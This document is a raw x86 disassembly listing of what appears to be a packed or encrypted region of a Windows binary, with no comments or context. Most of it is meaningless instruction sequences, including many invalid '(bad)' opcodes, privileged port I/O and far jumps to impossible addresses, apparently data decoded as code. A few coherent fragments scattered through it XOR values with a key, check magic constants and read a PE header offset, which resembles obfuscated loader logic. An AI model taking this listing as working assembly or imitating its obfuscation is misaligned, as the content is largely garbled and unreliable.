  40bdc4:	outs   dx,BYTE PTR ds:[esi]
  40bdc5:	adc    eax,0xd46499ae
  40bdca:	xor    cl,BYTE PTR [eax-0x2474c188]
  40bdd0:	into   
  40bdd1:	adc    edx,ecx
  40bdd3:	pop    ds
  40bdd4:	xchg   BYTE PTR [eax-0x11],ah
  40bdd7:	nop
  40bdd8:	mov    al,ds:0xb474e21
  40bddd:	das    
  40bdde:	mov    WORD PTR [edi+ebx*8],cs
  40bde1:	(bad)  
  40bde2:	push   ds
  40bde3:	jp     0x40be3d
  40bde5:	mov    ch,0x4d
  40bde7:	xor    al,0x41
  40bde9:	sar    BYTE PTR [edi-0x4a],0x70
  40bded:	bswap  ecx
  40bdef:	push   esp
  40bdf0:	push   cs
  40bdf1:	pushf  
  40bdf2:	sub    eax,0x10fef44e
  40bdf7:	int    0x13
  40bdf9:	jns    0x40bdfd
  40bdfb:	or     al,0xe5
  40bdfd:	ins    DWORD PTR es:[edi],dx
  40bdfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdff:	push   ss
  40be00:	jno    0x40be6a
  40be02:	or     ebp,ebx
  40be04:	repnz cmp eax,0x1f7a76b9
  40be0a:	mov    ax,0xe8e9
  40be0e:	xchg   edi,eax
  40be0f:	clc    
  40be10:	inc    ebx
  40be11:	adc    ebp,DWORD PTR [eax]
  40be13:	jg     0x40be7a
  40be15:	push   edx
  40be16:	not    DWORD PTR gs:[esi+ebp*8-0x6817e2b0]
  40be1e:	cmp    eax,0x17f05ef5
  40be23:	and    ecx,DWORD PTR [esi]
  40be25:	out    dx,al
  40be26:	xor    DWORD PTR [ebx],edx
  40be28:	xchg   esp,eax
  40be29:	outs   dx,BYTE PTR ds:[esi]
  40be2a:	ror    DWORD PTR [edx-0x5f3018f1],1
  40be30:	mov    eax,ds:0xf0e481ee
  40be35:	add    DWORD PTR [ebx-0x5d8aacfc],edi
  40be3b:	sub    DWORD PTR [esi+edx*8-0x4d],eax
  40be3f:	jmp    0x81bf3dc0
  40be44:	sti    
  40be45:	aam    0x44
  40be47:	stc    
  40be48:	xchg   ebx,ecx
  40be4a:	(bad)  
  40be4b:	mov    ebx,DWORD PTR [edi-0x6e]
  40be4e:	push   eax
  40be4f:	aaa    
  40be50:	mov    esp,0x81d50bd0
  40be55:	das    
  40be56:	data16 rol dh,cl
  40be59:	icebp  
  40be5a:	iret   
  40be5b:	gs retf 0x76e2
  40be5f:	mov    esp,0x63231532
  40be64:	sub    ah,cl
  40be66:	pop    edi
  40be67:	mov    bh,0x1b
  40be69:	mov    gs,WORD PTR [esi+0x782e8995]
  40be6f:	in     eax,dx
  40be70:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40be72:	stc    
  40be73:	ja     0x40beb1
  40be75:	nop
  40be76:	rol    BYTE PTR [esi],cl
  40be78:	xor    eax,0xa8be8122
  40be7d:	or     dl,cl
  40be7f:	mov    al,ds:0x329565e8
  40be84:	push   edi
  40be85:	(bad)  
  40be86:	ror    ch,cl
  40be88:	xor    eax,0x38d42f09
  40be8d:	fmul   DWORD PTR [eax]
  40be8f:	outs   dx,DWORD PTR ds:[esi]
  40be90:	out    dx,al
  40be91:	cld    
  40be92:	loopne 0x40beb0
  40be94:	mov    cl,0xfe
  40be96:	push   edi
  40be97:	push   ds
  40be98:	and    eax,0x75ee189a
  40be9d:	mov    ebp,0x9a03ae15
  40bea2:	ins    BYTE PTR es:[edi],dx
  40bea3:	clc    
  40bea4:	mov    BYTE PTR ds:0x946db3c7,dh
  40beaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beab:	jbe    0x40be60
  40bead:	cmp    eax,0x4a2f0f21
  40beb2:	push   edi
  40beb3:	out    dx,al
  40beb4:	(bad)  
  40beb6:	adc    edx,ebx
  40beb8:	ins    DWORD PTR es:[edi],dx
  40beb9:	leave  
  40beba:	adc    esi,DWORD PTR ds:0x60ccc870
  40bec0:	shl    DWORD PTR [esi+0x1468fd80],1
  40bec6:	dec    eax
  40bec7:	popa   
  40bec8:	inc    esi
  40bec9:	aam    0x9f
  40becb:	dec    BYTE PTR [ebx-0x45c92590]
  40bed1:	das    
  40bed2:	shr    DWORD PTR [ecx+eax*4+0x437e83c6],1
  40bed9:	xchg   ecx,eax
  40beda:	xchg   edx,eax
  40bedb:	mov    ah,0x35
  40bedd:	out    0xa0,eax
  40bedf:	push   0x9a2cdf12
  40bee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee5:	ficomp DWORD PTR ds:0xaf10c4a2
  40beeb:	inc    ebp
  40beec:	push   esi
  40beed:	jno    0x40bf2b
  40beef:	inc    esp
  40bef0:	mov    esp,0x553420cb
  40bef5:	sbb    edx,ecx
  40bef7:	cmp    dh,0x4f
  40befa:	into   
  40befb:	push   ecx
  40befc:	jns    0x40bf53
  40befe:	add    eax,0x350eaa0c
  40bf03:	xchg   DWORD PTR [eax],edx
  40bf05:	add    BYTE PTR [eax],dl
  40bf07:	enter  0xe8ed,0xd5
  40bf0b:	es aam 0x0
  40bf0e:	mov    ecx,0xb08cfc89
  40bf13:	inc    esi
  40bf14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf15:	fidiv  WORD PTR [ebp+0x6406eae4]
  40bf1b:	(bad)  
  40bf1c:	mov    DWORD PTR [ebx+esi*8+0x5e],0x22aa840c
  40bf24:	hlt    
  40bf25:	and    al,0xdb
  40bf27:	jecxz  0x40bf29
  40bf29:	(bad)  
  40bf2a:	push   ebx
  40bf2b:	xchg   esi,eax
  40bf2c:	mov    cl,0xfa
  40bf2e:	dec    esi
  40bf2f:	(bad)
  40bf32:	push   esi
  40bf33:	iret   
  40bf34:	pop    esp
  40bf35:	test   DWORD PTR [edx-0x3c],esi
  40bf38:	cmp    al,cl
  40bf3a:	inc    ebx
  40bf3b:	cmp    eax,0xc12748d9
  40bf40:	pop    esi
  40bf41:	jle    0x40bee0
  40bf43:	sbb    al,0x1e
  40bf45:	shr    edx,0x39
  40bf48:	or     eax,0x88892d85
  40bf4d:	in     al,dx
  40bf4e:	jbe    0x40bed3
  40bf50:	push   cs
  40bf51:	pop    eax
  40bf52:	(bad)
  40bf55:	add    eax,0x930bfcf4
  40bf5a:	pop    ecx
  40bf5b:	jge    0x40bfba
  40bf5d:	shr    DWORD PTR [ebp+0x2ff4821c],0x3d
  40bf64:	push   edi
  40bf65:	dec    esp
  40bf66:	push   ds
  40bf67:	out    0x15,eax
  40bf69:	jle    0x40bf1c
  40bf6b:	fisubr DWORD PTR [ebp+edi*8+0x76f20e57]
  40bf72:	out    0x25,eax
  40bf74:	add    BYTE PTR [edx+0x6d98e836],0x46
  40bf7b:	pop    ebx
  40bf7c:	in     al,0x38
  40bf7e:	xor    DWORD PTR [edx],ebx
  40bf80:	ja     0x40bf4c
  40bf82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf83:	cmp    ebp,ebx
  40bf85:	mov    al,ds:0x4d2e2d07
  40bf8a:	shl    DWORD PTR [ebx+edx*2-0x61],0x63
  40bf8f:	cld    
  40bf90:	push   ebx
  40bf91:	lahf   
  40bf92:	outs   dx,DWORD PTR ds:[esi]
  40bf93:	cs sti 
  40bf95:	nop
  40bf96:	fcomp  DWORD PTR [ebx+0x71]
  40bf99:	cmc    
  40bf9a:	sti    
  40bf9b:	daa    
  40bf9c:	inc    esp
  40bf9d:	cmp    eax,0x5dfd2cb3
  40bfa2:	std    
  40bfa3:	push   ebp
  40bfa4:	pop    ebx
  40bfa5:	fst    DWORD PTR [ebx+0x29]
  40bfa8:	in     eax,0xbb
  40bfaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfab:	mov    dl,cl
  40bfad:	(bad)  [edi-0x30f793be]
  40bfb3:	(bad)  
  40bfb4:	adc    edx,0x68a7e9fa
  40bfba:	mov    dh,al
  40bfbc:	loope  0x40bf50
  40bfbe:	stos   WORD PTR es:[edi],ax
  40bfc0:	call   0xa8a7a83d
  40bfc5:	mov    ds:0x16613d01,eax
  40bfca:	xlat   BYTE PTR ds:[ebx]
  40bfcb:	jo     0x40bff8
  40bfcd:	(bad)  
  40bfcf:	sub    eax,0xabf5385
  40bfd4:	sub    edi,edx
  40bfd6:	inc    esi
  40bfd7:	imul   esp,DWORD PTR fs:[ebx+0x708dc5c1],0x7ba7921d
  40bfe2:	inc    ebx
  40bfe3:	push   ebx
  40bfe4:	push   eax
  40bfe5:	dec    ebp
  40bfe6:	add    DWORD PTR [eax+0x2e9b4d0d],0x40
  40bfed:	fs int3 
  40bfef:	rol    ebp,cl
  40bff1:	aam    0x1a
  40bff3:	(bad)
  40bff8:	mov    esi,0x8ab58363
  40bffe:	test   DWORD PTR [esp+esi*4+0x5417b94f],edi
  40c005:	stc    
  40c006:	mov    ds:0x33107834,eax
  40c00b:	cmp    di,WORD PTR [edi-0x2f]
  40c00f:	bound  ecx,QWORD PTR [esi-0x64]
  40c012:	(bad)  
  40c014:	fnsave [ebp-0x28ca05ee]
  40c01a:	jl     0x40bfe0
  40c01c:	mov    dl,0x1e
  40c01e:	ss pop ds
  40c020:	inc    eax
  40c021:	mov    eax,ds:0xeeae4181
  40c026:	sti    
  40c027:	mov    dh,0xb6
  40c029:	cmp    BYTE PTR [edi-0x75],bl
  40c02c:	les    edi,FWORD PTR [ecx]
  40c02e:	(bad)  
  40c02f:	cs mov cl,0x6f
  40c032:	xor    cl,ch
  40c034:	ins    DWORD PTR es:[edi],dx
  40c035:	mul    BYTE PTR [eax+0x66]
  40c038:	pusha  
  40c039:	cs jmp 0xafd8:0xde4cd157
  40c041:	and    al,0xda
  40c043:	arpl   WORD PTR [edx+0x59884a43],bp
  40c049:	pop    ebp
  40c04a:	add    DWORD PTR [edx+edx*4-0x52],eax
  40c04e:	sahf   
  40c04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c050:	leave  
  40c051:	adc    eax,0x9d40f1db
  40c056:	inc    esi
  40c057:	inc    edi
  40c058:	cld    
  40c059:	and    eax,0xaffdc2c5
  40c05e:	in     eax,dx
  40c05f:	pushf  
  40c060:	mov    ebp,0x93955bd7
  40c065:	fsub   DWORD PTR [ebx-0x2ef0f939]
  40c06b:	pop    es
  40c06c:	sbb    di,WORD PTR [ebx+0x70]
  40c070:	sbb    edx,ebx
  40c072:	adc    ah,bh
  40c074:	shr    DWORD PTR [ebp-0x69],1
  40c077:	inc    edx
  40c078:	mov    esp,0x3adc0e4
  40c07d:	add    BYTE PTR [ecx],ch
  40c07f:	mov    ds:0x7a6be32e,eax
  40c084:	scas   al,BYTE PTR es:[edi]
  40c085:	out    0xa3,eax
  40c087:	ret    0xc531
  40c08a:	pop    ss
  40c08b:	adc    DWORD PTR [ebx+0x48],ebx
  40c08e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c090:	dec    esp
  40c091:	enter  0x89bd,0xbb
  40c095:	or     BYTE PTR [ecx],bh
  40c097:	mov    dh,0x7f
  40c099:	pop    esi
  40c09a:	sbb    BYTE PTR [ebx-0x2],dh
  40c09d:	in     al,dx
  40c09e:	(bad)
  40c0a3:	mov    dh,al
  40c0a5:	or     ecx,DWORD PTR [esp+ebx*4]
  40c0a8:	loope  0x40c054
  40c0aa:	rol    DWORD PTR [eax+0x63],cl
  40c0ad:	loopne 0x40c062
  40c0af:	jmp    0x8eefd83e
  40c0b4:	add    al,0xd1
  40c0b6:	int3   
  40c0b7:	out    dx,al
  40c0b8:	ror    BYTE PTR [edx],1
  40c0ba:	mov    al,ds:0x6ebd1524
  40c0bf:	je     0x40c10e
  40c0c1:	stos   BYTE PTR es:[edi],al
  40c0c2:	jmp    0xb0ca09fd
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	fwait
  40c104:	scas   al,BYTE PTR es:[edi]
  40c105:	test   al,0x3c
  40c107:	imul   edi,ebx,0x7d2e7e7e
  40c10d:	jle    0x40c18d
  40c10f:	jmp    0x40c14b
  40c111:	into   
  40c112:	fs dec edi
  40c114:	xchg   esi,eax
  40c115:	inc    esp
  40c116:	adc    al,0x6b
  40c118:	pop    eax
  40c119:	lods   al,BYTE PTR ds:[esi]
  40c11a:	sub    DWORD PTR [ebx],0x53
  40c11d:	call   0x3a4:0xe844c7af
  40c124:	xor    al,0x85
  40c126:	jle    0x40c112
  40c128:	mov    bh,0xa9
  40c12a:	push   esp
  40c12b:	imul   al
  40c12d:	push   edi
  40c12e:	or     al,0xe8
  40c130:	imul   esi,ebx,0x10
  40c133:	ins    BYTE PTR es:[edi],dx
  40c134:	add    al,0x61
  40c136:	inc    esp
  40c137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c138:	jg     0x40c152
  40c13a:	fimul  DWORD PTR [ecx+0xb]
  40c13d:	pop    esp
  40c13e:	and    BYTE PTR [ebx-0x7d],0x8f
  40c142:	int3   
  40c143:	jmp    0x9cd2:0x4df763f5
  40c14a:	cdq    
  40c14b:	fisub  DWORD PTR [edx-0x10]
  40c14e:	arpl   WORD PTR [esi-0x38],sp
  40c151:	loope  0x40c136
  40c153:	adc    bl,BYTE PTR [ebx]
  40c155:	fist   WORD PTR [ebx+edx*4-0x4]
  40c159:	popf   
  40c15a:	stos   DWORD PTR es:[edi],eax
  40c15b:	icebp  
  40c15c:	mov    esp,DWORD PTR [ebx+0x59617758]
  40c162:	pop    es
  40c163:	add    cl,BYTE PTR [esp+eax*4+0x63fe94fa]
  40c16a:	das    
  40c16b:	sub    DWORD PTR [ebp+eiz*1-0x58],edi
  40c16f:	aas    
  40c170:	push   eax
  40c171:	or     al,0xce
  40c173:	pop    esp
  40c174:	stos   DWORD PTR es:[edi],eax
  40c175:	dec    edx
  40c176:	jl     0x40c104
  40c178:	and    BYTE PTR [esi+0x69],dh
  40c17b:	loopne 0x40c132
  40c17d:	and    eax,0x6b15516a
  40c182:	push   ss
  40c183:	or     edi,edi
  40c185:	dec    ecx
  40c186:	or     eax,0x421262dc
  40c18b:	fidiv  WORD PTR [esi+eax*4+0x60]
  40c18f:	gs mov dl,0x39
  40c192:	jbe    0x40c155
  40c194:	scas   al,BYTE PTR es:[edi]
  40c195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c196:	loope  0x40c212
  40c198:	std    
  40c199:	arpl   WORD PTR [edi+0x2e],di
  40c19c:	add    BYTE PTR [esp+ecx*8+0x46769784],bh
  40c1a3:	call   0xbe8c679a
  40c1a8:	ds cmp eax,0x1da46144
  40c1ae:	jmp    0x8e86dac4
  40c1b3:	or     BYTE PTR es:[edi+edx*1],bl
  40c1b7:	test   BYTE PTR [edx+0x79],bl
  40c1ba:	xchg   esi,eax
  40c1bb:	adc    eax,0x62c839df
  40c1c0:	xchg   ebx,eax
  40c1c1:	int3   
  40c1c2:	xchg   esp,eax
  40c1c3:	add    cl,BYTE PTR [esi]
  40c1c5:	sub    ebp,edi
  40c1c7:	bound  esi,QWORD PTR [edi+0x4e]
  40c1ca:	fmul   DWORD PTR [esi+0x565220bd]
  40c1d0:	or     al,0x81
  40c1d2:	test   edi,edx
  40c1d4:	scas   eax,DWORD PTR es:[edi]
  40c1d5:	scas   eax,DWORD PTR es:[edi]
  40c1d6:	gs in  eax,0x57
  40c1d9:	mov    bh,0x61
  40c1db:	iret   
  40c1dc:	fst    QWORD PTR ds:0x35ec0197
  40c1e2:	or     eax,0xdc3dd3cc
  40c1e7:	dec    edi
  40c1e8:	retf   
  40c1e9:	cld    
  40c1ea:	mov    ebp,esi
  40c1ec:	aam    0x28
  40c1ee:	mov    ebp,0x346b4cfa
  40c1f3:	(bad)  
  40c1f4:	loopne 0x40c21a
  40c1f6:	xor    ch,BYTE PTR [edi+eiz*1+0x4ad93603]
  40c1fd:	shr    DWORD PTR [ebp-0x56],cl
  40c200:	sbb    al,0x9c
  40c202:	std    
  40c203:	in     al,dx
  40c204:	loopne 0x40c27e
  40c206:	and    ebp,DWORD PTR [edx-0x7e]
  40c209:	retf   0xf796
  40c20c:	dec    esi
  40c20d:	cmp    al,0xc5
  40c20f:	xor    al,0x5e
  40c211:	xor    eax,0x87ec784c
  40c216:	sub    eax,0xcf6b91d
  40c21b:	dec    ecx
  40c21c:	sub    dl,BYTE PTR [esp+ebx*1+0x488b7a8a]
  40c223:	lods   al,BYTE PTR ds:[esi]
  40c224:	push   cs
  40c225:	or     eax,DWORD PTR [ebp+0x2f]
  40c228:	mov    al,0x2a
  40c22a:	in     eax,dx
  40c22b:	ficom  WORD PTR [edi-0x1d]
  40c22e:	call   0x9cc9:0xb09babc1
  40c235:	fidiv  DWORD PTR [esi-0x613e65d7]
  40c23b:	pop    edi
  40c23c:	mov    esi,0xb5fb87c3
  40c241:	adc    ebx,DWORD PTR [eax+eiz*2-0x7c30a80e]
  40c248:	adc    al,0xb0
  40c24a:	inc    ah
  40c24c:	in     eax,dx
  40c24d:	pop    ecx
  40c24e:	jg     0x40c212
  40c250:	lahf   
  40c251:	(bad)  
  40c252:	shl    BYTE PTR [edi+0xc5d42c9],0x4c
  40c259:	ss cli 
  40c25b:	xchg   edx,eax
  40c25c:	jns    0x40c1f2
  40c25e:	jl     0x40c24d
  40c260:	adc    ebx,DWORD PTR [edx-0x4d]
  40c263:	inc    edi
  40c264:	pop    edi
  40c265:	in     al,dx
  40c266:	xchg   edx,eax
  40c267:	inc    edi
  40c268:	and    eax,ebx
  40c26a:	pop    esp
  40c26b:	jg     0x40c280
  40c26d:	sub    ebx,0x79bc06b7
  40c273:	sbb    eax,0x956de0d5
  40c278:	mov    eax,0x7b3bfa98
  40c27d:	mov    ds:0x48547802,al
  40c282:	push   edx
  40c283:	shl    DWORD PTR [ecx+0x15],1
  40c286:	outs   dx,DWORD PTR ds:[esi]
  40c287:	sub    DWORD PTR [ebp+0x62],esp
  40c28a:	inc    eax
  40c28b:	push   es
  40c28c:	or     edx,DWORD PTR [ecx-0x66b8354b]
  40c292:	ror    cl,0x1b
  40c295:	(bad)  
  40c296:	daa    
  40c297:	inc    esp
  40c298:	es cdq 
  40c29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c29b:	out    dx,al
  40c29c:	nop
  40c29d:	test   eax,0x74d9b684
  40c2a2:	add    cl,BYTE PTR [eax-0x7f]
  40c2a5:	jg     0x40c22b
  40c2a7:	jnp    0x40c258
  40c2a9:	pop    eax
  40c2aa:	pushf  
  40c2ab:	fcomp  QWORD PTR [esi+0x2c75305c]
  40c2b1:	mov    al,ds:0x480832d2
  40c2b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2b7:	dec    ecx
  40c2b8:	out    0x49,eax
  40c2ba:	mov    esi,0x90c79589
  40c2bf:	dec    ebx
  40c2c0:	inc    ebx
  40c2c1:	repz mov ah,0x43
  40c2c4:	adc    DWORD PTR ds:0xcfc91a6b,ebp
  40c2ca:	lods   al,BYTE PTR ds:[esi]
  40c2cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2cd:	jp     0x40c343
  40c2cf:	pop    di
  40c2d1:	add    dh,bl
  40c2d3:	pop    ss
  40c2d4:	rol    BYTE PTR [eax-0x3affb80f],cl
  40c2da:	push   edi
  40c2db:	jecxz  0x40c31e
  40c2dd:	fs repz pusha 
  40c2e0:	das    
  40c2e1:	stc    
  40c2e2:	xchg   ebx,eax
  40c2e3:	mov    bh,0x31
  40c2e5:	out    0x70,eax
  40c2e7:	inc    esp
  40c2e8:	pop    esp
  40c2e9:	add    BYTE PTR [edx+0xebdeb37],ah
  40c2ef:	popf   
  40c2f0:	(bad)  
  40c2f1:	andps  xmm1,XMMWORD PTR [ecx+0x16]
  40c2f5:	pop    eax
  40c2f6:	cdq    
  40c2f7:	jbe    0x40c32b
  40c2f9:	rcl    BYTE PTR [edx+0x549e029a],0x12
  40c300:	or     bh,dl
  40c302:	out    dx,eax
  40c303:	cmp    BYTE PTR [edx],ch
  40c305:	test   BYTE PTR [esi],0xb
  40c308:	nop
  40c309:	ja     0x40c291
  40c30b:	mov    ah,0x27
  40c30d:	xchg   ebx,edx
  40c30f:	sbb    al,0xd8
  40c311:	outs   dx,DWORD PTR ds:[esi]
  40c312:	js     0x40c373
  40c314:	(bad)  
  40c315:	loop   0x40c345
  40c317:	bound  esp,QWORD PTR [eax]
  40c319:	outs   dx,BYTE PTR ds:[esi]
  40c31a:	(bad)  
  40c31b:	retf   0xa475
  40c31e:	pop    esi
  40c31f:	sbb    DWORD PTR [ebx-0x4a371556],edx
  40c325:	fmul   st(6),st
  40c327:	mov    esi,0xbeb319a1
  40c32c:	push   ss
  40c32d:	mov    ch,0xc
  40c32f:	imul   esi,esi,0xa0141d2
  40c335:	outs   dx,BYTE PTR ds:[esi]
  40c336:	std    
  40c337:	cmp    ebp,esi
  40c339:	dec    eax
  40c33a:	sti    
  40c33b:	loop   0x40c38c
  40c33d:	je     0x40c2f1
  40c33f:	pop    edx
  40c340:	pop    edi
  40c341:	fcom   DWORD PTR [ebp+edi*1+0xe9820fe]
  40c348:	inc    eax
  40c349:	enter  0x7416,0x81
  40c34d:	cdq    
  40c34e:	xchg   DWORD PTR [edx-0x5f65fa22],ebx
  40c354:	mov    bl,0xda
  40c356:	pop    ecx
  40c357:	(bad)  
  40c358:	fcomp  QWORD PTR [esi+0x3]
  40c35b:	mov    esi,esi
  40c35d:	pop    ebx
  40c35e:	popf   
  40c35f:	push   esi
  40c360:	mov    esp,0x9153663d
  40c365:	mov    BYTE PTR [esi-0x9],ah
  40c368:	sub    edx,DWORD PTR [edi+0x38]
  40c36b:	(bad)
  40c36f:	push   edx
  40c370:	adc    dh,BYTE PTR [esi+0x78a01273]
  40c376:	dec    edi
  40c377:	pop    esi
  40c378:	mov    WORD PTR [esi+eiz*4-0x1e7b9a66],ds
  40c37f:	add    al,cl
  40c381:	pop    ebp
  40c382:	(bad)  
  40c383:	pop    ebx
  40c384:	(bad)  
  40c385:	js     0x40c397
  40c387:	mov    al,ds:0xcb2cd332
  40c38c:	shl    cl,1
  40c38e:	call   0xb527:0xde53b486
  40c395:	(bad)  
  40c396:	lahf   
  40c397:	mov    ebp,0xc53e9b55
  40c39c:	fisub  DWORD PTR cs:[edx-0xa652595]
  40c3a3:	addr16 shl dl,1
  40c3a6:	je     0x40c3d1
  40c3a8:	cld    
  40c3a9:	inc    esp
  40c3aa:	dec    ecx
  40c3ab:	lahf   
  40c3ac:	ret    0xb09b
  40c3af:	push   ecx
  40c3b0:	mov    BYTE PTR [ecx],bh
  40c3b2:	pushf  
  40c3b3:	mov    WORD PTR ds:0x74579601,cs
  40c3b9:	les    edi,FWORD PTR [edx+0x60]
  40c3bc:	push   0x8d60389
  40c3c1:	cmp    al,0xca
  40c3c3:	retf   
  40c3c4:	fiadd  WORD PTR [ecx-0x75]
  40c3c7:	inc    ebp
  40c3c8:	pushf  
  40c3c9:	or     al,0x65
  40c3cb:	stc    
  40c3cc:	out    0xf3,eax
  40c3ce:	adc    eax,0xff114e1
  40c3d3:	jne    0x40c3f6
  40c3d5:	es das 
  40c3d7:	mov    bl,0xb3
  40c3d9:	cmp    eax,0x44f71741
  40c3de:	fwait
  40c3df:	pop    edx
  40c3e0:	jns    0x40c398
  40c3e2:	shl    DWORD PTR [edi+eiz*4],0x92
  40c3e6:	adc    dl,BYTE PTR [ebp-0x6a4dcbf2]
  40c3ec:	call   0xbbcabe95
  40c3f1:	das    
  40c3f2:	lahf   
  40c3f3:	jl     0x40c392
  40c3f5:	mov    edi,cr0
  40c3f8:	add    dl,BYTE PTR [ebx+edx*1+0x3700b8f]
  40c3ff:	sub    al,0xfd
  40c401:	stc    
  40c402:	fs in  al,dx
  40c404:	mov    ah,0x67
  40c406:	cdq    
  40c407:	aaa    
  40c408:	leave  
  40c409:	pop    ebp
  40c40a:	repnz xchg ecx,eax
  40c40c:	std    
  40c40d:	fld    QWORD PTR [ecx-0x60]
  40c410:	xor    ah,bl
  40c412:	xor    cl,BYTE PTR [eax]
  40c414:	sub    ch,BYTE PTR [edi]
  40c416:	aad    0x55
  40c418:	jnp    0x40c47b
  40c41a:	inc    ecx
  40c41b:	cs out 0xe2,eax
  40c41e:	mov    al,ds:0xab8054f6
  40c423:	jle    0x40c46f
  40c425:	add    al,0xdb
  40c427:	adc    al,bl
  40c429:	outs   dx,DWORD PTR ds:[esi]
  40c42a:	xchg   esp,eax
  40c42b:	pop    esi
  40c42c:	les    edx,FWORD PTR [edx+edi*8]
  40c42f:	fsub   QWORD PTR fs:[edx-0x381b8156]
  40c436:	jno    0x40c3c9
  40c438:	inc    esp
  40c439:	in     al,dx
  40c43a:	cmc    
  40c43b:	neg    DWORD PTR [ecx]
  40c43d:	jle    0x40c478
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x62]
  40c49b:	cwde   
  40c49c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c49d:	leave  
  40c49e:	sbb    DWORD PTR [edi+0x7d2e7e7e],eax
  40c4a4:	jle    0x40c524
  40c4a6:	dec    ebp
  40c4a7:	les    eax,FWORD PTR [esi-0x1c]
  40c4aa:	es add eax,edx
  40c4ad:	xor    al,0x4b
  40c4af:	out    dx,al
  40c4b0:	jns    0x40c50c
  40c4b2:	jb     0x40c4f8
  40c4b4:	mov    dl,0xde
  40c4b6:	cld    
  40c4b7:	inc    esp
  40c4b8:	sub    ebp,eax
  40c4ba:	jb     0x40c49a
  40c4bc:	aad    0x2c
  40c4be:	and    ah,al
  40c4c0:	dec    ebx
  40c4c1:	xchg   edi,eax
  40c4c2:	lahf   
  40c4c3:	add    edi,DWORD PTR [ecx+0x2e6d1cce]
  40c4c9:	add    DWORD PTR [ecx-0x5e21738c],ebp
  40c4cf:	(bad)  
  40c4d0:	not    DWORD PTR ss:[ecx+0x1c]
  40c4d4:	xchg   ecx,eax
  40c4d5:	mov    ds:0x8adc016e,al
  40c4da:	scas   eax,DWORD PTR es:[edi]
  40c4db:	mov    esi,0x88effe23
  40c4e0:	aaa    
  40c4e1:	arpl   WORD PTR [esp+ebp*1],bx
  40c4e4:	inc    ebx
  40c4e5:	cdq    
  40c4e6:	lock ja 0x40c532
  40c4e9:	test   al,0xc
  40c4eb:	adc    DWORD PTR [esp+ebp*8-0x45],ebx
  40c4ef:	mov    eax,0x41ef5c50
  40c4f4:	xor    edx,DWORD PTR [esi+esi*2]
  40c4f7:	and    esp,ebp
  40c4f9:	mov    al,0x47
  40c4fb:	ret    
  40c4fc:	jno    0x40c52a
  40c4fe:	inc    esi
  40c4ff:	inc    edi
  40c500:	lahf   
  40c501:	add    DWORD PTR [ebx-0x43ca49e9],esp
  40c507:	jne    0x40c531
  40c509:	xor    BYTE PTR [ebp+0x6f8865a1],dh
  40c50f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c510:	or     edi,ecx
  40c512:	cld    
  40c513:	dec    esp
  40c514:	das    
  40c515:	aam    0x12
  40c517:	add    DWORD PTR [edx-0x3466afa2],edx
  40c51d:	pop    es
  40c51e:	loope  0x40c56c
  40c520:	cwde   
  40c521:	scas   eax,DWORD PTR es:[edi]
  40c522:	jb     0x40c562
  40c524:	mov    ?,WORD PTR [edi]
  40c526:	in     eax,dx
  40c527:	push   eax
  40c528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c529:	fadd   DWORD PTR [ebp+0x4f]
  40c52c:	fxch   st(1)
  40c52e:	aas    
  40c52f:	or     al,0xd1
  40c531:	iret   
  40c532:	xor    DWORD PTR [edx+0x67],edx
  40c535:	cld    
  40c536:	aam    0x81
  40c538:	dec    ebx
  40c539:	push   ebx
  40c53a:	jb     0x40c598
  40c53c:	cmp    al,0x62
  40c53e:	jge    0x40c539
  40c540:	adc    BYTE PTR [ecx+edx*1],ch
